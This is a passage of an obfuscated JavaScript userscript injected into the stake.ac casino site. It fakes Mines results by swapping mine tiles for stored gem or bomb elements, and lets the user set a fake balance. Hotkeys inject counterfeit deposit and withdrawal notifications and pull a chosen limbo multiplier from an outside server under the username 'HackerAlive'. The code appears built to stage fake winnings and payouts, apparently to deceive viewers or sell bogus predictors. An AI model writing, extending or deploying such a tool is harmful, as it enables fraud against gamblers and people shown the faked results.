          _0x4434b5.style.backgroundColor = _0x2ec30c;
          _0x4434b5.style.boxShadow = "none";
          _0x4434b5.textContent = "Fake Mines Activated";
        } else {
          _0x4434b5.disabled = false;
          _0x4434b5.style.cursor = "pointer";
          _0x4434b5.style.backgroundColor = _0x13d182;
          _0x4434b5.style.boxShadow = "0 0 10px " + _0x13d182;
          _0x4434b5.textContent = "Activate Fake Mines V2";
        }
      } else if (_0x10d17c.startsWith("https://stake.ac/casino/games/mines")) {
        if (!('1' !== _0x15bf7e || !_0x10d17c.startsWith("https://stake.ac/casino/games/mines") || _0x35a124 || _0x52e332)) {
          _0x52e332 = true;
          _0x35a124 = true;
          _0x4434b5.disabled = true;
          _0x4434b5.style.cursor = "not-allowed";
          _0x4434b5.style.backgroundColor = _0x2ec30c;
          _0x4434b5.style.boxShadow = "none";
          _0x4434b5.textContent = "Fake Mines Activated";
          _0x58a1b3();
        }
      } else {
        _0x4434b5.disabled = true;
        _0x4434b5.style.cursor = "not-allowed";
        _0x4434b5.style.backgroundColor = _0x2ec30c;
        _0x4434b5.style.boxShadow = "none";
        _0x4434b5.textContent = "Activate Fake Mines V2";
      }
    }
    function _0x2560b1(_0xe41833 = false) {
      return _0xe41833 ? _0x22d188(_0x54dbe2, 0x1e) || "#555" : _0x27463e(_0x54dbe2) || "rgb(67, 181, 129)";
    }
    _0x3a9243();
    _0x337eeb = setInterval(_0x3a9243, 0x1f4);
    _0x395663.addEventListener("click", () => {
      if (!_0x356ed4) {
        const _0x162eba = localStorage.getItem("themeColor") || "#f55359";
        const _0x545998 = _0x162eba ? _0x22d188(_0x162eba, -0x1e) : '#f55359';
        _0x395663.textContent = "Fake Mines Activated";
        _0x395663.disabled = true;
        _0x395663.style.cursor = "not-allowed";
        _0x395663.style.backgroundColor = _0x545998;
        _0x395663.style.boxShadow = "0 0 10px " + _0x545998;
        _0x356ed4 = true;
        _0x1d576c();
      }
    });
    _0x140434.querySelector("#betAmount").addEventListener("input", _0x29d43c => {
      _0x2fe346 = parseFloat(_0x29d43c.target.value);
      if ('https://stake.ac/casino/games/blackjack' === window.location.href) {
        document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label > div > div.input-content.svelte-1nbx5re > input").value = _0x2fe346.toFixed(0x2);
        const _0xf509f = document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > span > div.currency-conversion.svelte-e4myuj > div > div");
        const _0x4793c5 = {
          'usd': {
            'ltc': _0x58a80a,
            'eth': _0x120044,
            'pol': _0x15c063,
            'btc': _0xfd6c3e,
            'usdt': 0x1
          },
          'eur': {
            'ltc': _0x262b8b,
            'eth': _0x124372,
            'matic': _0x21c78d,
            'btc': _0x217262
          }
        };
        let _0x4c0f2d;
        let _0x475e79;
        if ("usd" === _0xbe34bd) {
          _0x475e79 = _0x2fe346;
          _0x4c0f2d = _0x4793c5.usd[_0x48a9fe];
        } else if ("eur" === _0xbe34bd) {
          _0x475e79 = _0x2fe346 * _0x124a7d;
          _0x4c0f2d = _0x4793c5.usd[_0x48a9fe];
        } else if ("inr" === _0xbe34bd) {
          _0x475e79 = _0x2fe346 / _0x368347;
          _0x4c0f2d = _0x4793c5.usd[_0x48a9fe];
        }
        let _0x291101 = (_0x475e79 / _0x4c0f2d).toFixed(0x8);
        _0xf509f.innerText = _0x291101 + " " + _0x48a9fe.toUpperCase();
      } else {
        document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > div > div.input-content.svelte-1nbx5re > input").value = _0x2fe346.toFixed(0x2);
        const _0x2a4e08 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > span > div.currency-conversion.svelte-e4myuj > div > div");
        const _0x503acc = {
          'usd': {
            'ltc': _0x58a80a,
            'eth': _0x120044,
            'pol': _0x15c063,
            'btc': _0xfd6c3e,
            'usdt': 0x1
          },
          'eur': {
            'ltc': _0x262b8b,
            'eth': _0x124372,
            'matic': _0x21c78d,
            'btc': _0x217262
          }
        };
        let _0x1c37f2;
        let _0x45ef8e;
        if ("usd" === _0xbe34bd) {
          _0x45ef8e = _0x2fe346;
          _0x1c37f2 = _0x503acc.usd[_0x48a9fe];
        } else if ("eur" === _0xbe34bd) {
          _0x45ef8e = _0x2fe346 * _0x124a7d;
          _0x1c37f2 = _0x503acc.usd[_0x48a9fe];
        } else if ("inr" === _0xbe34bd) {
          _0x45ef8e = _0x2fe346 / _0x368347;
          _0x1c37f2 = _0x503acc.usd[_0x48a9fe];
        }
        let _0x5ab5ea = (_0x45ef8e / _0x1c37f2).toFixed(0x8);
        _0x2a4e08.innerText = _0x5ab5ea + " " + _0x48a9fe.toUpperCase();
      }
    });
    _0x140434.querySelector("#balanceAmount").addEventListener("input", _0x39ecfb => {
      const _0x2b99b7 = _0x369ea9[_0xbe34bd];
      localStorage.setItem("latest_bal", parseFloat(_0x39ecfb.target.value).toFixed(0x2));
      _0x264fba().innerText = _0x2b99b7 + parseFloat(_0x39ecfb.target.value).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
    });
    const _0x32cff4 = _0x140434.querySelector("#autoActivateSwitch");
    _0x32cff4.addEventListener('click', () => {
      if (_0x356ed4) {
        return void _0x367e4d("Please enable this option before interacting with the fake mines buttons.");
      }
      if (_0x35a124) {
        return void _0x367e4d("Please disable this option in any other tab before proceeding.");
      }
      const _0x4120d2 = _0x32cff4.style.backgroundColor === _0x2560b1();
      _0x32cff4.style.backgroundColor = _0x4120d2 ? _0x2560b1(true) : _0x2560b1();
      _0x32cff4.querySelector("div").style.left = _0x4120d2 ? '5px' : "25px";
      localStorage.setItem('autoActivateFakeMines', _0x4120d2 ? '0' : '1');
    });
    const _0x1e269d = _0x140434.querySelector("#autoLoadBalanceSwitch");
    _0x1e269d.addEventListener("click", () => {
      const _0x2a4c4b = _0x1e269d.style.backgroundColor === _0x2560b1();
      _0x1e269d.style.backgroundColor = _0x2a4c4b ? _0x2560b1(true) : _0x2560b1();
      _0x1e269d.querySelector("div").style.left = _0x2a4c4b ? "5px" : "25px";
      localStorage.setItem("autoLoadPreviousBalance", _0x2a4c4b ? '0' : '1');
    });
    const _0x26477e = _0x140434.querySelector('#toggleSwitch');
    _0x26477e.addEventListener("click", () => {
      const _0x5be387 = localStorage.getItem('showAccessGranted');
      const _0x560806 = '1' === _0x5be387 || null === _0x5be387;
      _0x26477e.style.backgroundColor = _0x560806 ? _0x2560b1(true) : _0x2560b1();
      _0x26477e.querySelector('div').style.left = _0x560806 ? '5px' : '25px';
      localStorage.setItem("showAccessGranted", _0x560806 ? '0' : '1');
    });
    const _0x5659e6 = _0x140434.querySelector("#notifyMissingItemsSwitch");
    _0x5659e6.addEventListener("click", () => {
      const _0x2d95f6 = localStorage.getItem("notifyMissingItems");
      const _0x6c866b = '1' === _0x2d95f6 || null === _0x2d95f6;
      _0x5659e6.style.backgroundColor = _0x6c866b ? _0x2560b1(true) : _0x2560b1();
      _0x5659e6.querySelector("div").style.left = _0x6c866b ? "5px" : "25px";
      localStorage.setItem("notifyMissingItems", _0x6c866b ? '0' : '1');
    });
    const _0x178922 = _0x140434.querySelector("#autoShowPredictorSwitch");
    _0x178922.addEventListener("click", () => {
      const _0x1b1ae3 = localStorage.getItem("autoShowPredictor");
      const _0x4c07e1 = '1' === _0x1b1ae3 || null === _0x1b1ae3;
      _0x178922.style.backgroundColor = _0x4c07e1 ? _0x2560b1(true) : _0x2560b1();
      _0x178922.querySelector("div").style.left = _0x4c07e1 ? "5px" : "25px";
      localStorage.setItem("autoShowPredictor", _0x4c07e1 ? '0' : '1');
    });
    const _0x17bdf0 = _0x140434.querySelector('#customizedmultiSwitch');
    _0x17bdf0.addEventListener("click", () => {
      const _0x30dbcb = _0x17bdf0.style.backgroundColor === _0x2560b1();
      _0x17bdf0.style.backgroundColor = _0x30dbcb ? _0x2560b1(true) : _0x2560b1();
      _0x17bdf0.querySelector("div").style.left = _0x30dbcb ? "5px" : "25px";
      _0x2c27fe = !_0x30dbcb;
      localStorage.setItem("customizedmulti", _0x30dbcb ? '0' : '1');
    });
    const _0x10e0eb = _0x140434.querySelector("#autoLoadStatisticsSwitch");
    _0x10e0eb.addEventListener("click", () => {
      const _0x35385a = _0x10e0eb.style.backgroundColor === _0x2560b1();
      _0x10e0eb.style.backgroundColor = _0x35385a ? _0x2560b1(true) : _0x2560b1();
      _0x10e0eb.querySelector("div").style.left = _0x35385a ? "5px" : '25px';
      localStorage.setItem("autoLoadPreviousStatistics", _0x35385a ? '0' : '1');
    });
    return _0x140434;
  }
  function _0x19f8ba() {
    _0x458fa0 = !_0x458fa0;
    if (!_0x1ec843) {
      _0x1ec843 = _0x55aad2();
    }
    _0x1ec843.style.display = _0x458fa0 ? "block" : "none";
  }
  function _0x1d576c() {
    _0x588f3f = document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div");
    _0x53a83b = _0x588f3f.querySelectorAll("button");
    _0x53a83b.forEach((_0x32ca56, _0x2e6fa7) => {
      _0x32ca56.addEventListener('click', () => {
        if (!_0x393f84) {
          return;
        }
        _0x32ca56.getAttribute("data-revealed");
        _0x63af73(() => "true" === _0x32ca56.getAttribute("data-revealed"), 0xa).then(() => {
          !function () {
            const _0x82d699 = document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div").querySelectorAll("button");
            const _0x331839 = [];
            for (; _0x331839.length < 0x5;) {
              const _0x88d195 = Math.floor(Math.random() * _0x82d699.length);
              if (!_0x331839.includes(_0x82d699[_0x88d195])) {
                _0x331839.push(_0x82d699[_0x88d195]);
              }
            }
            const _0xfafb41 = _0x331839.map(_0x48ed3a => _0x63af73(() => _0x48ed3a.classList.contains("mine"), 0x5f));
            Promise.any(_0xfafb41).then(() => {
              _0x82d699.forEach((_0x24a3e4, _0x100335) => {
                if (_0x24a3e4.hasAttribute("xmlns")) {
                  const _0x556d79 = localStorage.getItem("copiedBomb");
                  if (_0x556d79) {
                    const _0x15d9b3 = new DOMParser().parseFromString(_0x556d79, "text/html");
                    _0x24a3e4.replaceWith(_0x15d9b3.body.firstChild);
                  }
                }
              });
            })["catch"](_0x45d352 => {});
          }();
          const _0x3c214d = localStorage.getItem("copiedMineElement");
          if ("gem" === _0x32ca56.classList[0x1]) {
            document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button").addEventListener("click", function () {
              _0x4fc25c();
            });
            return Promise.reject("Stopping further execution");
          }
          if ("mine" === _0x32ca56.classList[0x1] && _0x3c214d) {
            const _0x36c633 = new DOMParser().parseFromString(_0x3c214d, "text/html");
            _0x32ca56.replaceWith(_0x36c633.body.firstChild);
          }
          _0x1445db = _0x563b91 => _0x588f3f.querySelectorAll("div.cover.gem.svelte-1avx2pj").length > 0x1 || _0x588f3f.querySelector('div.cover.gem.svelte-1avx2pj') && parseInt(_0x588f3f.querySelector("div.cover.gem.svelte-1avx2pj").dataset.index) !== _0x563b91;
          0xa;
          return new Promise(_0x3b3f66 => {
            const _0x49258b = () => {
              if (_0x588f3f.querySelectorAll("div.cover.gem.svelte-1avx2pj").length > 0x1 || _0x588f3f.querySelector('div.cover.gem.svelte-1avx2pj') && parseInt(_0x588f3f.querySelector("div.cover.gem.svelte-1avx2pj").dataset.index) !== _0x2e6fa7) {
                _0x3b3f66();
              } else {
                setTimeout(_0x49258b, 0xa);
              }
            };
            _0x49258b();
          });
          var _0x1445db;
        }).then(() => {
          document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl > label > div.labels.svelte-5v1hdl > span > span").innerText = "Total profit (24.75×)";
          _0x153c2f(_0x3e4e76 => {});
        })["catch"](_0x1b1031 => {});
      });
    });
  }
  function _0x5a84e7(_0x57c6a7) {
    if (_0x458fa0) {
      return;
    }
    const _0x4debec = document.createElement("div");
    _0x4debec.style.position = "fixed";
    _0x4debec.style.top = "50%";
    _0x4debec.style.left = "50%";
    _0x4debec.style.transform = "translate(-50%, -50%)";
    _0x4debec.style.backgroundColor = "rgba(0, 0, 0, 0.8)";
    _0x4debec.style.color = 'white';
    _0x4debec.style.padding = "20px";
    _0x4debec.style.borderRadius = "5px";
    _0x4debec.style.zIndex = "9999";
    _0x4debec.innerHTML = "<p>" + _0x57c6a7 + "</p>";
    document.body.appendChild(_0x4debec);
    _0x458fa0 = true;
    setTimeout(() => {
      document.body.removeChild(_0x4debec);
      _0x458fa0 = false;
    }, 0x1388);
  }
  document.addEventListener("keydown", function (_0x3336dd) {
    if ('F2' === _0x3336dd.key) {
      _0x3336dd.preventDefault();
      if (!_0x5de51f) {
        return;
      }
      _0x19f8ba();
    } else {
      if ('F8' === _0x3336dd.key) {
        _0x3336dd.preventDefault();
        if (!_0x5de51f) {
          return;
        }
        if (window.location.href.startsWith('https://stake.ac/casino/games/mines')) {
          if (!_0x18b21d) {
            createRightSideGUI();
          }
          _0x18b21d.style.display = _0x144f61 ? "none" : "block";
          _0x144f61 = !_0x144f61;
        }
      } else {
        if ('F1' === _0x3336dd.key) {
          _0x3336dd.preventDefault();
          if (!_0x5de51f) {
            return;
          }
          if (!localStorage.getItem("copiedBomb")) {
            return;
          }
          !function () {
            if (document.querySelector(".confirmation-overlay")) {
              return;
            }
            const _0x471172 = document.createElement("div");
            _0x471172.className = "confirmation-overlay";
            _0x471172.style.position = "fixed";
            _0x471172.style.top = '0';
            _0x471172.style.left = '0';
            _0x471172.style.width = '100%';
            _0x471172.style.height = '100%';
            _0x471172.style.backgroundColor = "rgba(0, 0, 0, 0.7)";
            _0x471172.style.zIndex = '9999';
            const _0x895140 = document.createElement("div");
            _0x895140.style.position = "fixed";
            _0x895140.style.top = "50%";
            _0x895140.style.left = "50%";
            _0x895140.style.transform = "translate(-50%, -50%)";
            _0x895140.style.background = "rgba(50, 50, 50, 0.9)";
            _0x895140.style.color = "white";
            _0x895140.style.padding = "30px";
            _0x895140.style.borderRadius = "10px";
            _0x895140.style.boxShadow = "0 4px 15px rgba(0, 0, 0, 0.5)";
            _0x895140.style.zIndex = "1000";
            const _0x3dda3a = document.createElement('h2');
            _0x3dda3a.textContent = "Are you sure you want to wipe the mines setup?";
            _0x3dda3a.style.textAlign = "center";
            _0x3dda3a.style.marginBottom = "20px";
            _0x895140.appendChild(_0x3dda3a);
            const _0x4fd22a = document.createElement("div");
            _0x4fd22a.style.display = "flex";
            _0x4fd22a.style.justifyContent = "space-around";
            _0x4fd22a.style.marginTop = "20px";
            const _0x30037d = document.createElement("button");
            _0x30037d.textContent = 'Confirm';
            _0x30037d.style.cssText = "\n        background-color: #4caf50;\n        color: white;\n        border: none;\n        padding: 10px 20px;\n        border-radius: 5px;\n        cursor: pointer;\n        transition: transform 0.2s ease, background-color 0.2s ease;\n        font-size: 16px; // Increase font size\n        flex: 1; // Make buttons equal width\n        margin: 0 10px; // Space between buttons\n    ";
            _0x30037d.style.backgroundColor = '#4caf50';
            _0x30037d.onmouseenter = () => {
              _0x30037d.style.transform = 'scale(1.1)';
            };
            _0x30037d.onmouseleave = () => {
              _0x30037d.style.transform = "scale(1)";
            };
            _0x30037d.onclick = () => {
              localStorage.removeItem("uncovered");
              localStorage.removeItem("copiedBomb");
              localStorage.removeItem('copiedMineElement');
              localStorage.removeItem("copiedWinMenu");
              alert("Mines setup wiped!");
              document.body.removeChild(_0x471172);
            };
            const _0x4ed8a3 = document.createElement('button');
            _0x4ed8a3.textContent = "Close";
            _0x4ed8a3.style.cssText = "\n        background-color: #4caf50;\n        color: white;\n        border: none;\n        padding: 10px 20px;\n        border-radius: 5px;\n        cursor: pointer;\n        transition: transform 0.2s ease, background-color 0.2s ease;\n        font-size: 16px; // Increase font size\n        flex: 1; // Make buttons equal width\n        margin: 0 10px; // Space between buttons\n    ";
            _0x4ed8a3.style.backgroundColor = '#ff4757';
            _0x4ed8a3.onmouseenter = () => {
              _0x4ed8a3.style.transform = "scale(1.1)";
            };
            _0x4ed8a3.onmouseleave = () => {
              _0x4ed8a3.style.transform = 'scale(1)';
            };
            _0x4ed8a3.onclick = () => {
              document.body.removeChild(_0x471172);
            };
            _0x471172.addEventListener("click", _0x407003 => {
              if (_0x407003.target === _0x471172) {
                document.body.removeChild(_0x471172);
              }
            });
            _0x895140.addEventListener('click', _0x5be9d1 => {
              _0x5be9d1.stopPropagation();
            });
            _0x4fd22a.appendChild(_0x30037d);
            _0x4fd22a.appendChild(_0x4ed8a3);
            _0x895140.appendChild(_0x4fd22a);
            _0x471172.appendChild(_0x895140);
            document.body.appendChild(_0x471172);
          }();
        } else {
          if ('F5' === _0x3336dd.key) {
            _0x3336dd.preventDefault();
            if (!_0x5de51f) {
              return;
            }
            if (!_0x2c27fe) {
              return;
            }
            (async function (_0x101cd9, _0x5cb1ef) {
              const _0x1c09d1 = 'https://onhood.vercel.app/change?gamemode=' + _0x101cd9 + "&username=" + _0x5cb1ef;
              try {
                const _0x344149 = new Headers({
                  'Content-Type': "application/json"
                });
                const _0x375031 = await fetch(_0x1c09d1, {
                  'method': 'GET',
                  'headers': _0x344149
                });
                if (!_0x375031.ok) {
                  await _0x375031.json();
                  throw new Error("Error: " + _0x375031.status + " " + _0x375031.statusText);
                }
                const _0x3cc296 = await _0x375031.json();
                return Number(_0x3cc296.multiplier);
              } catch (_0x433916) {
                console.error("Failed to fetch multiplier:", _0x433916);
                return null;
              }
            })('limbo', "HackerAlive").then(_0x125956 => {
              if (_0x125956) {
                _0x246db2 = Number(_0x125956).toFixed(0x2);
              }
            });
          } else {
            if ('F9' === _0x3336dd.key) {
              _0x3336dd.preventDefault();
              if (!_0x5de51f) {
                return;
              }
              if (!localStorage.getItem("notification")) {
                return;
              }
              if (!(localStorage.getItem("fakeDeposit") && !isNaN(localStorage.getItem("fakeDeposit")) && Number(localStorage.getItem("fakeDeposit")) > 0x0)) {
                return void _0x367e4d("Enter the amount first.");
              }
              let _0x16d3fc;
              let _0x41b828 = localStorage.getItem("notification");
              if (_0x41b828) {
                let _0x52f57c = document.createElement('div');
                _0x52f57c.innerHTML = _0x41b828;
                document.querySelector("#notifications-nav-button").appendChild(_0x52f57c.firstChild);
              }
              let _0x325587;
              let _0x4bed45 = Number(localStorage.getItem("fakeDeposit"));
              if ('ltc' === _0x48a9fe) {
                _0x16d3fc = _0x41155a("withdraw_ltc");
                _0x325587 = Math.floor(0x1d4c1 * Math.random()) + 0x2bf20;
              } else if ('eth' === _0x48a9fe) {
                _0x16d3fc = _0x41155a("withdraw_eth");
                _0x325587 = Math.floor(0xea61 * Math.random()) + 0x7530;
              } else if ("pol" === _0x48a9fe) {
                _0x16d3fc = _0x41155a("withdraw_matic");
                _0x325587 = Math.floor(0xea61 * Math.random()) + 0xea60;
              } else if ('btc' === _0x48a9fe) {
                _0x16d3fc = _0x41155a("withdraw_btc");
                _0x325587 = Math.floor(0x1d4c1 * Math.random()) + 0x493e0;
              }
              const _0x545956 = _0x16d3fc.cloneNode(true);
              _0x5c7e3e(_0x545956, 0x1, _0x4bed45.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ','));
              _0x4dfab7(".notification-list.svelte-18t4teo[style=\"z-index: 1700\"]", _0x545956);
              setTimeout(() => {
                const _0x349923 = _0x16d3fc.cloneNode(true);
                let _0xbb8ac3;
                _0x5c7e3e(_0x349923, 0x2, _0x4bed45.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ','));
                _0x4dfab7(".notification-list.svelte-18t4teo[style=\"z-index: 1700\"]", _0x349923);
                const _0x10a211 = _0x264fba();
                const _0x21a383 = parseFloat(_0x10a211.innerText.replace(/[^\d.]/g, ''));
                localStorage.setItem("latest_bal", _0x21a383 + _0x4bed45);
                if ("usd" === _0xbe34bd) {
                  _0xbb8ac3 = '$' + (_0x21a383 + _0x4bed45).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                  _0x10a211.innerText = _0xbb8ac3;
                } else if ("eur" === _0xbe34bd) {
                  _0xbb8ac3 = '€' + (_0x21a383 + _0x4bed45).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                  _0x10a211.innerText = _0xbb8ac3;
                } else if ('inr' === _0xbe34bd) {
                  _0xbb8ac3 = '₹' + (_0x21a383 + _0x4bed45).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                  _0x10a211.innerText = _0xbb8ac3;
                }
              }, _0x325587);
            } else {
              if ('F7' === _0x3336dd.key) {
                _0x3336dd.preventDefault();
                if (!_0x5de51f) {
                  return;
                }
                if (_0x40724d) {
                  return;
                }
                if ("https://stake.ac/casino/games/limbo" !== window.location.href) {
                  return;
                }
                _0x40724d = true;
                _0x874bc8();
              }
            }
          }
        }
      }
    }
  });
  if (!_0x5c9718) {
    if ('https://stake.ac' === window.location.href || "https://stake.ac/" === window.location.href) {
      _0x5d11b0();
    } else if ('1' === localStorage.getItem("autoLoadPreviousBalance")) {
      _0x4482fc();
    }
  }
}();